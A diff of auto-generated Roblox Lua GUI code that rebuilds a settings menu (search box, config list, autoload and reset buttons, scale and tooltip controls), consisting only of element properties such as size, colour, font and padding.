+G2L["ce"] = Instance.new("TextBox", G2L["c4"]);
+G2L["ce"]["Visible"] = false;
+G2L["ce"]["Name"] = [[search]];
+G2L["ce"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["ce"]["PlaceholderColor3"] = Color3.fromRGB(201, 201, 201);
+G2L["ce"]["BorderSizePixel"] = 0;
+G2L["ce"]["TextWrapped"] = true;
+G2L["ce"]["TextSize"] = 14;
+G2L["ce"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ce"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ce"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ce"]["PlaceholderText"] = [[Search...]];
+G2L["ce"]["Size"] = UDim2.new(1, -25, 1, 0);
+G2L["ce"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ce"]["Text"] = [[]];
+G2L["ce"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize
-G2L["cf"] = Instance.new("Frame", G2L["cd"]);
-G2L["cf"]["ZIndex"] = 99;
-G2L["cf"]["BorderSizePixel"] = 0;
-G2L["cf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["cf"]["Size"] = UDim2.new(0, 79, 0, 20);
-G2L["cf"]["Position"] = UDim2.new(0.54598, 0, 0, 0);
-G2L["cf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["cf"]["Name"] = [[guisize]];
-G2L["cf"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.search.UIPadding
+G2L["cf"] = Instance.new("UIPadding", G2L["ce"]);
+G2L["cf"]["PaddingLeft"] = UDim.new(0, 6);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.UIPadding
-G2L["d0"] = Instance.new("UIPadding", G2L["cf"]);
-G2L["d0"]["PaddingTop"] = UDim.new(0, 2);
-G2L["d0"]["PaddingRight"] = UDim.new(0, 3);
-G2L["d0"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["d0"]["PaddingBottom"] = UDim.new(0, 2);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.search.text
+G2L["d0"] = Instance.new("UIStroke", G2L["ce"]);
+G2L["d0"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox
-G2L["d1"] = Instance.new("TextBox", G2L["cf"]);
-G2L["d1"]["Name"] = [[textbox]];
-G2L["d1"]["PlaceholderColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["d1"]["TextSize"] = 14;
-G2L["d1"]["TextColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["d1"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["d1"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["d1"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["d1"]["PlaceholderText"] = [[1.00]];
-G2L["d1"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["d1"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["d1"]["Text"] = [[]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.fillbar
+G2L["d1"] = Instance.new("Frame", G2L["c3"]);
+G2L["d1"]["ZIndex"] = 90;
+G2L["d1"]["BorderSizePixel"] = 0;
+G2L["d1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d1"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["d1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d1"]["Name"] = [[fillbar]];
+G2L["d1"]["BackgroundTransparency"] = 0.95;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.outlineStroke
-G2L["d2"] = Instance.new("UIStroke", G2L["d1"]);
-G2L["d2"]["Thickness"] = 2;
-G2L["d2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["d2"]["Name"] = [[outlineStroke]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistLABEL
+G2L["d2"] = Instance.new("Frame", G2L["6c"]);
+G2L["d2"]["BorderSizePixel"] = 0;
+G2L["d2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d2"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["d2"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
+G2L["d2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d2"]["Name"] = [[configlistLABEL]];
+G2L["d2"]["LayoutOrder"] = 6;
+G2L["d2"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.buttonFade
-G2L["d3"] = Instance.new("CanvasGroup", G2L["d1"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistLABEL.text
+G2L["d3"] = Instance.new("TextLabel", G2L["d2"]);
+G2L["d3"]["TextWrapped"] = true;
+G2L["d3"]["ZIndex"] = 10;
 G2L["d3"]["BorderSizePixel"] = 0;
+G2L["d3"]["TextSize"] = 14;
+G2L["d3"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["d3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["d3"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d3"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["d3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d3"]["BackgroundTransparency"] = 1;
 G2L["d3"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["d3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["d3"]["Name"] = [[buttonFade]];
+G2L["d3"]["Text"] = [[Config list]];
+G2L["d3"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.buttonFade.UIGradient
-G2L["d4"] = Instance.new("UIGradient", G2L["d3"]);
-G2L["d4"]["Rotation"] = 90;
-G2L["d4"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistLABEL.text.UIPadding
+G2L["d4"] = Instance.new("UIPadding", G2L["d3"]);
+G2L["d4"]["PaddingLeft"] = UDim.new(0, 6);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.guisize.textbox.text
-G2L["d5"] = Instance.new("UIStroke", G2L["d1"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistLABEL.text.text
+G2L["d5"] = Instance.new("UIStroke", G2L["d3"]);
 G2L["d5"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.text
-G2L["d6"] = Instance.new("TextLabel", G2L["cd"]);
-G2L["d6"]["TextWrapped"] = true;
-G2L["d6"]["ZIndex"] = 99;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload
+G2L["d6"] = Instance.new("Frame", G2L["6c"]);
 G2L["d6"]["BorderSizePixel"] = 0;
-G2L["d6"]["TextSize"] = 14;
-G2L["d6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
 G2L["d6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["d6"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["d6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["d6"]["BackgroundTransparency"] = 1;
-G2L["d6"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["d6"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["d6"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
 G2L["d6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["d6"]["Text"] = [[GUI Scale:]];
-G2L["d6"]["Name"] = [[text]];
+G2L["d6"]["Name"] = [[removeautoload]];
+G2L["d6"]["LayoutOrder"] = 8;
+G2L["d6"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.text.UIPadding
-G2L["d7"] = Instance.new("UIPadding", G2L["d6"]);
-G2L["d7"]["PaddingLeft"] = UDim.new(0, 4);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button
+G2L["d7"] = Instance.new("TextButton", G2L["d6"]);
+G2L["d7"]["BorderSizePixel"] = 0;
+G2L["d7"]["TextTransparency"] = 1;
+G2L["d7"]["TextSize"] = 14;
+G2L["d7"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["d7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["d7"]["ZIndex"] = 49;
+G2L["d7"]["BackgroundTransparency"] = 1;
+G2L["d7"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["d7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["d7"]["Name"] = [[button]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.text.text
-G2L["d8"] = Instance.new("UIStroke", G2L["d6"]);
-G2L["d8"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.UIPadding
+G2L["d8"] = Instance.new("UIPadding", G2L["d7"]);
+G2L["d8"]["PaddingTop"] = UDim.new(0, 2);
+G2L["d8"]["PaddingRight"] = UDim.new(0, 3);
+G2L["d8"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["d8"]["PaddingBottom"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault
-G2L["d9"] = Instance.new("Frame", G2L["b4"]);
-G2L["d9"]["ZIndex"] = 99;
-G2L["d9"]["BorderSizePixel"] = 0;
-G2L["d9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["d9"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["d9"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["d9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["d9"]["Name"] = [[resetdefault]];
-G2L["d9"]["LayoutOrder"] = 100;
-G2L["d9"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.buttonFrame
+G2L["d9"] = Instance.new("Frame", G2L["d7"]);
+G2L["d9"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["d9"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["d9"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["d9"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["d9"]["Name"] = [[buttonFrame]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button
-G2L["da"] = Instance.new("TextButton", G2L["d9"]);
-G2L["da"]["BorderSizePixel"] = 0;
-G2L["da"]["TextTransparency"] = 1;
-G2L["da"]["TextSize"] = 14;
-G2L["da"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["da"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["da"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["da"]["ZIndex"] = 99;
-G2L["da"]["BackgroundTransparency"] = 1;
-G2L["da"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["da"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["da"]["Name"] = [[button]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.buttonFrame.outlineStroke
+G2L["da"] = Instance.new("UIStroke", G2L["d9"]);
+G2L["da"]["Thickness"] = 2;
+G2L["da"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.UIPadding
-G2L["db"] = Instance.new("UIPadding", G2L["da"]);
-G2L["db"]["PaddingTop"] = UDim.new(0, 2);
-G2L["db"]["PaddingRight"] = UDim.new(0, 3);
-G2L["db"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["db"]["PaddingBottom"] = UDim.new(0, 2);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.buttonFrame.buttonFade
+G2L["db"] = Instance.new("CanvasGroup", G2L["d9"]);
+G2L["db"]["BorderSizePixel"] = 0;
+G2L["db"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["db"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["db"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["db"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["db"]["Name"] = [[buttonFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame
-G2L["dc"] = Instance.new("Frame", G2L["da"]);
-G2L["dc"]["ZIndex"] = 99;
-G2L["dc"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["dc"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["dc"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["dc"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["dc"]["Name"] = [[buttonFrame]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.buttonFrame.buttonFade.UIGradient
+G2L["dc"] = Instance.new("UIGradient", G2L["db"]);
+G2L["dc"]["Rotation"] = 90;
+G2L["dc"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame.outlineStroke
-G2L["dd"] = Instance.new("UIStroke", G2L["dc"]);
-G2L["dd"]["Thickness"] = 2;
-G2L["dd"]["Name"] = [[outlineStroke]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.text
+G2L["dd"] = Instance.new("TextLabel", G2L["d7"]);
+G2L["dd"]["ZIndex"] = 2;
+G2L["dd"]["BorderSizePixel"] = 0;
+G2L["dd"]["TextSize"] = 14;
+G2L["dd"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["dd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["dd"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["dd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["dd"]["BackgroundTransparency"] = 1;
+G2L["dd"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["dd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["dd"]["Text"] = [[Remove autoload]];
+G2L["dd"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame.buttonFade
-G2L["de"] = Instance.new("CanvasGroup", G2L["dc"]);
-G2L["de"]["BorderSizePixel"] = 0;
-G2L["de"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["de"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["de"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["de"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["de"]["Name"] = [[buttonFade]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.text.text
+G2L["de"] = Instance.new("UIStroke", G2L["dd"]);
+G2L["de"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.buttonFrame.buttonFade.UIGradient
-G2L["df"] = Instance.new("UIGradient", G2L["de"]);
-G2L["df"]["Rotation"] = 90;
-G2L["df"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.fillbar
+G2L["df"] = Instance.new("Frame", G2L["d6"]);
+G2L["df"]["ZIndex"] = 90;
+G2L["df"]["BorderSizePixel"] = 0;
+G2L["df"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["df"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["df"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["df"]["Name"] = [[fillbar]];
+G2L["df"]["BackgroundTransparency"] = 0.95;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.text
-G2L["e0"] = Instance.new("TextLabel", G2L["da"]);
-G2L["e0"]["ZIndex"] = 101;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside
+G2L["e0"] = Instance.new("Frame", G2L["69"]);
 G2L["e0"]["BorderSizePixel"] = 0;
-G2L["e0"]["TextSize"] = 14;
-G2L["e0"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["e0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["e0"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["e0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["e0"]["BackgroundTransparency"] = 1;
-G2L["e0"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["e0"]["Size"] = UDim2.new(0, 176, 0, 255);
+G2L["e0"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
 G2L["e0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["e0"]["Text"] = [[Reset to Default]];
-G2L["e0"]["Name"] = [[text]];
+G2L["e0"]["Name"] = [[leftside]];
+G2L["e0"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.button.text.text
-G2L["e1"] = Instance.new("UIStroke", G2L["e0"]);
-G2L["e1"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.UIListLayout
+G2L["e1"] = Instance.new("UIListLayout", G2L["e0"]);
+G2L["e1"]["Padding"] = UDim.new(0, 5);
+G2L["e1"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.resetdefault.fillbar
-G2L["e2"] = Instance.new("Frame", G2L["d9"]);
-G2L["e2"]["ZIndex"] = 100;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab
+G2L["e2"] = Instance.new("Frame", G2L["e0"]);
 G2L["e2"]["BorderSizePixel"] = 0;
-G2L["e2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["e2"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["e2"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
+G2L["e2"]["Size"] = UDim2.new(0, 176, 0, 160);
 G2L["e2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["e2"]["Name"] = [[fillbar]];
-G2L["e2"]["BackgroundTransparency"] = 0.95;
+G2L["e2"]["Name"] = [[uisettingsTab]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize
-G2L["e3"] = Instance.new("Frame", G2L["b4"]);
-G2L["e3"]["ZIndex"] = 99;
-G2L["e3"]["BorderSizePixel"] = 0;
-G2L["e3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["e3"]["Size"] = UDim2.new(1, 0, 0, 15);
-G2L["e3"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
-G2L["e3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["e3"]["Name"] = [[tooltipsize]];
-G2L["e3"]["LayoutOrder"] = 4;
-G2L["e3"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.uisettingsScript
+G2L["e3"] = Instance.new("LocalScript", G2L["e2"]);
+G2L["e3"]["Name"] = [[uisettingsScript]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button
-G2L["e4"] = Instance.new("TextButton", G2L["e3"]);
-G2L["e4"]["BorderSizePixel"] = 0;
-G2L["e4"]["TextTransparency"] = 1;
-G2L["e4"]["TextSize"] = 14;
-G2L["e4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["e4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["e4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.ACCENT
+G2L["e4"] = Instance.new("Frame", G2L["e2"]);
 G2L["e4"]["ZIndex"] = 99;
-G2L["e4"]["BackgroundTransparency"] = 1;
-G2L["e4"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["e4"]["BorderSizePixel"] = 0;
+G2L["e4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e4"]["Size"] = UDim2.new(1, 0, 0, 4);
 G2L["e4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["e4"]["Name"] = [[button]];
+G2L["e4"]["Name"] = [[ACCENT]];
+G2L["e4"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.UIPadding
-G2L["e5"] = Instance.new("UIPadding", G2L["e4"]);
-G2L["e5"]["PaddingTop"] = UDim.new(0, 2);
-G2L["e5"]["PaddingRight"] = UDim.new(0, 3);
-G2L["e5"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["e5"]["PaddingBottom"] = UDim.new(0, 2);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.ACCENT.GuiColor
+G2L["e5"] = Instance.new("Frame", G2L["e4"]);
+G2L["e5"]["ZIndex"] = 99;
+G2L["e5"]["BorderSizePixel"] = 0;
+G2L["e5"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["e5"]["Size"] = UDim2.new(0, 174, 0, 2);
+G2L["e5"]["Position"] = UDim2.new(0, 1, 0, 1);
+G2L["e5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e5"]["Name"] = [[GuiColor]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame
-G2L["e6"] = Instance.new("Frame", G2L["e4"]);
-G2L["e6"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["e6"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["e6"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["e6"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["e6"]["Name"] = [[sliderFrame]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.ACCENT.GuiColor.UICorner
+G2L["e6"] = Instance.new("UICorner", G2L["e5"]);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.outlineStroke
-G2L["e7"] = Instance.new("UIStroke", G2L["e6"]);
-G2L["e7"]["Thickness"] = 2;
-G2L["e7"]["Name"] = [[outlineStroke]];
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.UIListLayout
+G2L["e7"] = Instance.new("UIListLayout", G2L["e2"]);
+G2L["e7"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
+G2L["e7"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.buttonFade
-G2L["e8"] = Instance.new("CanvasGroup", G2L["e6"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE
+G2L["e8"] = Instance.new("Frame", G2L["e2"]);
+G2L["e8"]["ZIndex"] = 99;
 G2L["e8"]["BorderSizePixel"] = 0;
 G2L["e8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["e8"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["e8"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["e8"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["e8"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
 G2L["e8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["e8"]["Name"] = [[buttonFade]];
+G2L["e8"]["Name"] = [[TITLE]];
+G2L["e8"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.buttonFade.UIGradient
-G2L["e9"] = Instance.new("UIGradient", G2L["e8"]);
-G2L["e9"]["Rotation"] = 90;
-G2L["e9"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE.text
+G2L["e9"] = Instance.new("TextLabel", G2L["e8"]);
+G2L["e9"]["TextWrapped"] = true;
+G2L["e9"]["ZIndex"] = 99;
+G2L["e9"]["BorderSizePixel"] = 0;
+G2L["e9"]["TextSize"] = 14;
+G2L["e9"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["e9"]["TextTransparency"] = 0.3;
+G2L["e9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e9"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["e9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["e9"]["BackgroundTransparency"] = 1;
+G2L["e9"]["Size"] = UDim2.new(0, 172, 0, 15);
+G2L["e9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["e9"]["Text"] = [[UI Settings]];
+G2L["e9"]["Name"] = [[text]];
+G2L["e9"]["Position"] = UDim2.new(0.02273, 0, 0, 0);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.tooltipsize.button.sliderFrame.fillbar
-G2L["ea"] = Instance.new("Frame", G2L["e6"]);
-G2L["ea"]["ZIndex"] = 5;
-G2L["ea"]["BorderSizePixel"] = 0;
-G2L["ea"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["ea"]["Size"] = UDim2.new(0.5, 0, 1, 0);
-G2L["ea"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["ea"]["Name"] = [[fillbar]];
